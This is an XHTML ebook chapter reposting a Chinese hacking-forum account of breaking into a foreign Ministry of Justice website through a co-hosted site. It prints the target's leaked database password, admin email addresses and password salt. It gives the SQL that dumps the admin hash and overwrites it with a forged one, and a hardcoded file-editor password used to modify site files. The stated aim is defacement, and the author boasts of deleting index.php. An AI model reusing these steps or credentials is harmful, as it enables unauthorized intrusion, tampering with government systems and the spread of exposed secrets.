@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>通过旁注渗透拿下F国司法部</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>通过旁注渗透拿下F国司法部</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=217450319&amp;idx=1&amp;sn=cfe92ed9ff0cc59243bab6f77f990f2a&amp;chksm=16a4ffa821d376bed7e9d334810517f1b57b4111abbe782f7fbab5be378ea7063b7bb9ec8cb0&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=217450319&amp;idx=1&amp;sn=cfe92ed9ff0cc59243bab6f77f990f2a&amp;chksm=16a4ffa821d376bed7e9d334810517f1b57b4111abbe782f7fbab5be378ea7063b7bb9ec8cb0&amp;scene=27#wechat_redirect</a></blockquote><p>首先看了一下网站，没看出是什么程序写的，也没发现值得深入下手的地方。于是便旁注了，很快，拿到了一个旁站的shell。<br/>这才发现，服务器支持asp,aspx,php，但是限制很多。<br/>简单试了下没提权成功。反正拿服务器不是首要任务，首要任务是挂菊花聊天室，先挂上聊天室再提权(后来事实证明，还是先提权才能把主页挂上菊花的)。</p><p>**************************好了，正文开始*****************************<br/>很庆幸，这个vhost网站能跨站读取源码，但是权限不够，可以用webshell跨站读取一部分网站的源码，但是不能直接拷贝或者上传文件到目录<br/>当然，意思就是不能直接对doj.xx这个网站的目录中写入文件或者修改文件代码<br/>简单翻了一下网站目录，没有明显的后台登陆地址的标记<br/>登陆了一下MySQL账户，不是root，还是4.x，用处不大<br/>这几个目录中比较可疑的是：<br/>http://www.doj.xx/doj2.0/c0ntent/login.php<br/>访问这个地址，这个目录明显就是后台，这货后台隐藏的也够深的。<br/>如果这是注入拿站，拿站的人是要死的，MySQL 4.x的版本，管理员表是doj_auth_users，字段是pangalan，密码是n位SALT的SHA512加密，后台又这么深，真的是基霸管理员啊</p><p>后台隐藏这么深，我很怀疑是之前新闻说的F国要求各部门加强网站安全性通知以后管理员抽风给做成这样的</p><p>我先看了一下登录文件login.php的代码：</p><blockquote><p>if (isset($_POST['submit'])) {<br/>if (empty($_POST['user']) || empty($_POST['pass'])) {<br/>        $msg = "ERROR: Please check your input!";<br/>}<br/>/***** Calculate hashed password *****/<br/>$hash = new Crypt_Hash('sha512');<br/>$password = bin2hex($hash-&gt;hash(SALT.clean_field($_POST['pass'], 1)));<br/>$LOGINQUERY = "SELECT * FROM ".TBL_LOGIN." WHERE pangalan = '".clean_field(base64_encode($_POST['user']), 1)."'AND pasword = '".$password."'";<br/>$result = mysql_query($LOGINQUERY) or $msg = "Error executing query.";</p></blockquote><p>这段是密码验证部分的代码，简单来分析一下代码好了</p><p>Calculate hashed password前面的部分是验证输入的不为空，这个很简单，Calculate hashed password后面是加密密码和验证的部分，这里就比较郁闷了</p><p>pangalan应该是用户名的表段，而password明显就是密码的表段了。管理员字段是在：TBL_LOGIN 这个常量中存放的<br/>$password这个变量是经过加密的，看加密格式：</p><p>$password = bin2hex($hash-&gt;hash(SALT.clean_field($_POST['pass'], 1)));</p><p>先将POST提交的密码一次处理(初步判断是去空格引号转义等功能)后，和SALT常量结合，然后hash加密</p><p>那么我们再登陆数据库看看，登陆信息在include.php文件中，数据库的信息如下：</p><p>define ("HOST", "localhost");<br/>define ("USER", "dojmis");<br/>define ("PASS", "P@ssw0rd123");<br/>define ("DATABASENAME", "wcms1");<br/><br/>define ("ADMIN_EMAIL", "haroldtubangi@gmail.com");<br/>define ("ADMIN_EMAIL", "misd.doj@gmail.com, hgtubangi@doj.xx, harolaaaangi@gmail.com");<br/>define ("SALT", "Th1sSp3rL0ngStr1ngW1llPr0t3ctMyUs3rsAg@1nst1ns3cur3P@ssw0rds"); // salt to strenghten passwords<br/>define ("TBL_LOGIN", "doj_auth_users");</p><p>用dojmis和密码P@ssw0rd123登陆数据库成功(我很怀疑P@ssw0rd123就是FTP密码)执行以下SQL语句：</p><p>select pangalan,0x3a,pasword from doj_auth_users</p><p>上面的管理员表段名也是从include.php中找出来的，自己仔细看一下</p><p>得
+到：bWJi:bb376d2738b4561ad15973058f7a5b420a644cf2a29e997e9a656268c2bbfa9337ea7b2032129c8e74aa13cefeaf2294d1f7a784cb5d8864a7c80ba17a10f83b</p><p>我了个去，这么长的密文，跟md5看来是没关系了，直接逆向恐怕更不可能了</p><p>那咱们就分析分析他的加密方式，根据他的加密方式，咱们自己制作一个密码，直接给他改密码好了，然后用咱们自己的密码登陆后台</p><p>这中间有个clean_field()函数，这个函数在function.php中，其实看名字就知道是去空格等操作了，所以我们直接忽视<br/>上面的加密方式中有个SALT，那就先找SALT<br/>在include.php文件中：</p><p>define ("SALT", "Th1sSp3rL0ngStr1ngW1llPr0t3ctMyUs3rsAg@1nst1ns3cur3P@ssw0rds");</p><p>这么长的SALT，如果不提前知道，怎么能跑的出来密码。不过好在我们已经知道了</p><p>假定我要将密码设置为：silic，那么根据他的算法，加密前先和SALT混合，就是：<br/>Th1sSp3rL0ngStr1ngW1llPr0t3ctMyUs3rsAg@1nst1ns3cur3P@ssw0rdssilic</p><p>然后看看怎么进行hash加密<br/>看了这行代码：</p><p>$hash = new Crypt_Hash('sha512');</p><p>应该是sha512八九不离十了。于是将<br/>Th1sSp3rL0ngStr1ngW1llPr0t3ctMyUs3rsAg@1nst1ns3cur3P@ssw0rdssilic进行
+SHA512加密以后就得
+到：c42c6c5c1e85c1ed0237576d4ff8ef3a7c145455a350fd43a489ce92f62f0633484b8b0c9b0ba8f5cad4401ef1c5285b6396d24ba144616127f2376d61459a6a</p><p>得到了我们特定的密码的加密，然后就该修改数据库密码为我们的密码了。<br/>在数据库中执行SQL语句：</p><p>
+
+		</p><p>
+		
+			</p><p><span class="crayon-title"/>
+			</p><p><span class="crayon-language">Default</span></p><p>
+			
+			</p><p><textarea class="crayon-plain print-no" data-settings="dblclick" readonly="readonly" style="-moz-tab-size: 4; font-size: 12px ! important; line-height: 15px ! important; z-index: 0; opacity: 0; overflow: hidden;" wrap="soft">UPDATE doj_auth_users SET pasword='c42c6c5c1e85c1ed0237576d4ff8ef3a7c145455a350fd43a489ce92f62f0633484b8b0c9b0ba8f5cad4401ef1c5285b6396d24ba144616127f2376d61459a6a' WHERE pangalan='bWJi'</textarea></p><p>
+			</p><p>
+				</p><table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums" data-settings="show">
+					<p>1</p>
+				</td>
+						<td class="crayon-code"><p><span class="crayon-e">UPDATE </span><span class="crayon-e">doj_auth_users </span><span class="crayon-e">SET </span><span class="crayon-v">pasword</span><span class="crayon-o">=</span><span class="crayon-s">'c42c6c5c1e85c1ed0237576d4ff8ef3a7c145455a350fd43a489ce92f62f0633484b8b0c9b0ba8f5cad4401ef1c5285b6396d24ba144616127f2376d61459a6a'</span><span class="crayon-h"> </span><span class="crayon-e">WHERE </span><span class="crayon-v">pangalan</span><span class="crayon-o">=</span><span class="crayon-s">'bWJi'</span></p></td>
+					</tr>
+				</tbody></table><p>
+			</p><p>
+		</p><p>就将后台的登陆密码修改为silic了</p><p>但是这还没有结束，因为我们的目的是取到Webshell<br/>(其实这是图省事，因为咱们目的就是给他挂挂首页，取到Webshell足矣。但是。。。千万别抱这种想法，因为这个网站目测不提权是改不了主页的)</p><p>在登陆后台前，需要注意一个地方：</p><p>
+
+		</p><p>
+		
+			</p><p><span class="crayon-title"/>
+			</p><p><span class="crayon-language">Default</span></p><p>
+			
+			</p><p><textarea class="crayon-plain print-no" data-settings="dblclick" readonly="readonly" style="-moz-tab-size: 4; font-size: 12px ! important; line-height: 15px ! important; z-index: 0; opacity: 0; overflow: hidden;" wrap="soft">WHERE pangalan = '".clean_field(base64_encode($_POST['user']), 1)."'AND pasword = '.....</textarea></p><p>
+			</p><p>
+				</p><table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums" data-settings="show">
+					<p>1</p>
+				</td>
+						<td class="crayon-code"><p><span class="crayon-e">WHERE </span><span class="crayon-v">pangalan</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'".clean_field(base64_encode($_POST['</span><span class="crayon-i">user</span><span class="crayon-s">']), 1)."'</span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-v">pasword</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span>'<span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></p></td>
+					</tr>
+				</tbody></table><p>
+			</p><p>
+		</p><p>这里的用户名字段是pangalan，但是用户名是经过了base64加密的，数据库中的pangalan字段数据是bWJi，实际上的密码需要经过base64解密，解密后得到实际登陆用户名为：mbb<br/>用户名解出来了，密码自己给他改上去了。登陆后台</p><p>后台很简陋(但是很牛逼，居然会封ip，而且从头至尾居然封了我好几个ip，最后一不小心把index.php文件删了，也算是解了封我ip的气)</p><p>拿到webshell的话，发现只有一个fileedit.php可以加以利用，其他都是纯数据库操作<br/>我看了半天没看明白怎么用，两个输入框，左边长右边短</p><p>还是仔细分析一下代码：</p><p>
+
+		</p><p>
+		
+			</p><p><span class="crayon-title"/>
+			</p><p><span class="crayon-language">Default</span></p><p>
+			
+			</p><p><textarea class="crayon-plain print-no" data-settings="dblclick" readonly="readonly" style="-moz-tab-size: 4; font-size: 12px ! important; line-height: 15px ! important; z-index: 0; opacity: 0; overflow: hidden;" wrap="soft">if ($_SESSION['fe_flag'] == 1) {
+$f=fopen ($_SESSION['fe_filename'],"rb");
+$_SESSION['fe_data']='';
+while(!feof($f))
+$_SESSION['fe_data'].=fread($f,filesize($_SESSION['fe_filename']));
+fclose($f);</textarea></p><p>
+			</p><p>
+				</p><table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums" data-settings="show">
+					<p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p>
+				</td>
+						<td class="crayon-code"><p><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'fe_flag'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></p><p><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-o">=</span><span class="crayon-e">fopen</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'fe_filename'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-s">"rb"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></p><p><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'fe_data'</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-s">''</span><span class="crayon-sy">;</span></p><p><span class="crayon-st">while</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">feof</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></p><p><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'fe_data'</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-e">fread</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-e">filesize</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'fe_filename'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></p><p><span class="crayon-e">fclose</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">f</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></p></td>
+					</tr>
+				</tbody></table><p>
+			</p><p>
+		</p><p>仔细搜一下，果然又有一个密码验证，当POST的变量comment为密码时，就可以操作文件了</p><p>这次看清楚了，应该是没有加密了，直接密码就是：L@br@d0r<br/>再来看一下这个功能框里面的源码，看看哪个是comment变量：</p><p>
+
+		</p><p>
+		
+			</p><p><span class="crayon-title"/>
+			</p><p><span class="crayon-language">Default</span></p><p>
+			
+			</p><p><textarea class="crayon-plain print-no" data-settings="dblclick" readonly="readonly" style="-moz-tab-size: 4; font-size: 12px ! important; line-height: 15px ! important; z-index: 0; opacity: 0; overflow: hidden;" wrap="soft">&lt;form name="form1" method="post" action="fileedit.php"&gt;
+File: &lt;input type="text" name="titlepage" value=""  size="80" /&gt;&amp;nbsp;&amp;nbsp;
+&lt;input type="text" name="comment" value="" size="15" /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;center&gt;&lt;input type="submit" name='getfilename' value='Get File' /&gt;&lt;/center&gt;&lt;br /&gt;
+&lt;/form&gt;</textarea></p><p>
+			</p><p>
+				</p><table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums" data-settings="show">
+					<p>1</p><p>2</p><p>3</p><p>4</p><p>5</p>
+				</td>
+						<td class="crayon-code"><p><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"form1"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"post"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"fileedit.php"</span><span class="crayon-o">&gt;</span></p><p><span class="crayon-v">File</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"titlepage"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h">  </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"80"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&amp;</span><span class="crayon-v">nbsp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-v">nbsp</span><span class="crayon-sy">;</span></p><p><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"text"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"comment"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-s">"15"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></p><p><span class="crayon-o">&lt;</span><span class="crayon-v">br</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-v">br</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-v">center</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"submit"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">'getfilename'</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">'Get File'</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">center</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-v">br</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></p><p><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">form</span><span class="crayon-o">&gt;</span></p></td>
+					</tr>
+				</tbody></table><p>
+			</p><p>
+		</p><p>第一个输入框是文件名(titlepage变量)，第二个输入框是密码(comment变量)<br/>当第二个框的变量通过了系统的密码验证，就将第一个变量接收并读取这个文件</p><p>那么第一个框输入test.php第二个框输入L@br@d0r就能修改test.php这个文件了</p><p>done。</p><p><br/></p><p>via@习科论坛<br/></p>
+        
+</body>
+</html>
